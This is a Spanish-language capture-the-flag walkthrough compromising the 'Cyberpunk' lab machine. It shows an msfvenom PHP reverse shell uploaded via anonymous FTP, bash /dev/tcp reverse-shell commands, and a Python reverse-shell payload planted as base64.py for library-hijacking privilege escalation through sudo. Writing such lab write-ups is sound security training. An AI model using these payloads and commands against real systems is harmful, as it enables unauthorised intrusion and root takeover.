# Cyberpunk

Maquinas que vamos a utilizar Kali Linux y Cyberpunk [https://thehackerslabs.com/cyberpunk/](https://thehackerslabs.com/cyberpunk/)

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%2096.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=2000 -n -vvv -Pn 10.0.3.32
```

![image.png](./imagenes/image%2097.png)

- Miramos lo que corre por el puerto 80 en el navegador web y en el código de la web
    
    ![image.png](./imagenes/image%2098.png)
    
    `CTRL+U`
    
    ![image.png](./imagenes/image%2099.png)
    
    No se ve nada interesante.
    
- Vamos a probar con el FTP que admite usuario **anonymous**
    
    ```bash
    ftp 10.0.3.32
    ```
    
    ![image.png](./imagenes/image%20100.png)
    
    `ls`
    
    ![image.png](./imagenes/image%20101.png)
    
    Vemos que tenemos  un archivo index.html que seria el index principal.
    
    - Nos descargamos a nuestra maquina el archivo secret.txt
        
        `get secret.txt`
        
        ![image.png](./imagenes/image%20102.png)
        

- Visualizamos su contenido.
    
    `cat secret.txt` 
    
    ![image.png](./imagenes/image%20103.png)
    
    Tenemos un posible nombre de usuario **Arasaka**
    
- Creamos un archivo malicioso php con msfvemon y vamos a descargarlo en la maquina victima.
    
    ```bash
    msfvenom -p php/reverse_php LHOST=10.0.3.4 LPORT=443 -f raw > virus.php
    ```
    
    ![image.png](./imagenes/image%20104.png)
    
- En el FTP descargamos el archivo malicioso
    
    `put virus.php`
    
    `ls`
    
    ![image.png](./imagenes/image%20105.png)
    
- Nos ponemos a la espera en el puerto 443
    
    `nc -nlvp 443` 
    
    ![image.png](./imagenes/image%20106.png)
    
- Enel navegador web ejecutamos la siguiente URL http://10.0.3.32/virus.php
    
    ![image.png](./imagenes/image%20107.png)
    
    ![image.png](./imagenes/image%20108.png)
    
- Vamos a estabilizar la conexión.
    
    
    - Probamos a ejecutar una reverse shell . [https://www.revshells.com/](./imagenes/https://www.revshells.com/)
        
        ![image.png](./imagenes/image%2057.png)
        
        `sh -i >& /dev/tcp/10.0.3.4/444 0>&1`
        
        `bash -c "sh -i >& /dev/tcp/10.0.3.4/444 0>&1"`
        
    
    - Nos ponemos a la escucha en el puerto 444 con netcat.
        
        ![image.png](./imagenes/image%20109.png)
        
    
    - En la escucha 443 escribimos lo siguiente.
        
        `bash -c "sh -i >& /dev/tcp/10.0.3.4/444 0>&1"`
        
        ![image.png](./imagenes/image%20110.png)
        
    
    - Ya tenemos una conexión estable.
        
        ![image.png](./imagenes/image%20111.png)
        
    - Vamos a empezar el tratamiento de la TTY.
        - Escribimos el siguiente comando  y veremos que adquirimos un prompt.
            
            `script /dev/null -c bash`
            
        - Hacemos un **CTRL+Z**
            
            **`CTRL+Z`**
            
        - Escribimos a continuación.
            
            `stty raw -echo; fg`
            
        
        - Escribimos **reset xterm** . Es posible que no se muestre cuando lo escribimos pero aun así lo escribimos y pulsamos Enter. Y nos aparecerá la siguiente pantalla.
            
            `reset xterm`
            
        - Por ultimo tenemos que exportar 2 variables. escribimos lo siguiente.
            
            `export TERM=xterm`
            
            `export SHELL=bash`
            
            ![image.png](./imagenes/image%20112.png)
            
    
    - Vamos a husmear entre los directorios por ejemplo en el directorio **/opt**
        
        `cd /`
        
        `cd opt`
        
        `ls -la`
        
        ![image.png](./imagenes/image%20113.png)
        
        Miramos el contenido de arasaka.txt
        
        `cat arasaka.txt`
        
        ![image.png](./imagenes/image%20114.png)
        
    - Parece un codigo **Brainfuck. Usamos la pagina** [https://www.dcode.fr/brainfuck-language](./imagenes/https://www.dcode.fr/brainfuck-language) para decodificarlo.
        
        ![image.png](./imagenes/image%20115.png)
        
        **cyberpunk2077**
        
    - Lo probamos por que podría ser la contraseña del usuario **arasaka.**
        
        `su arasaka`
        
        `whoami`
        
        ![image.png](./imagenes/image%20116.png)
        
    - Miramos si hay algo interesante en la carpeta del usuario arasaka.
        
        `cd /home/arasaka`
        
        `ls -la`
        
        ![image.png](./imagenes/image%20117.png)
        
        Nos encontramos un archivo llamado [**randombase64.py](./imagenes/http://randombase64.py)** miramos que contiene.
        
        `cat [randombase64.py](./imagenes/http://randombase64.py/)` 
        
        ![image.png](./imagenes/image%20118.png)
        
        No podemos modificarlo pero si ejecutarlo. Vemos que importa la librería base64.
        
    - Vamos a hacer un **library hijacking** (colocaremos una versión maliciosa de la biblioteca en una ubicación prioritaria, el programa la ejecutará en lugar de la legítima).
        
        
        - Miramos **el path** que sigue python3 al leer las librerias.
            
            `python3 -c "import sys ; print(sys.path)"`
            
            ![image.png](./imagenes/image%20119.png)
            
            **`‘’`** nos indica que la primera ubicación es en el directorio actual.
            
        - Nos creamos un archivo llamado base64.py y le metemos una reverse Shell en Python. Usamos la web [https://www.revshells.com/](./imagenes/https://www.revshells.com/)
            
            
            ![image.png](./imagenes/image%20120.png)
            
            <aside>
            
            **import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.3.4",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")**
            
            </aside>
            
            `nano base64.py`
            
            ![image.png](./imagenes/image%20121.png)
            
            `ls -la`
            
            ![image.png](./imagenes/image%20122.png)
            
    - Nos ponemos a la escucha en el puerto 5555
        
        `nc -nlvp 5555`
        
        ![image.png](./imagenes/image%20123.png)
        
    - Recordamos las rutas absolutas que vamos a utilizar
        
        `sudo -l`
        
        ![image.png](./imagenes/image%20124.png)
        
    - Ejecutamos el archivo **randombase64.py**
        
        `sudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py`
        
        ![image.png](./imagenes/image%20125.png)
        
        ![image.png](./imagenes/image%20126.png)
       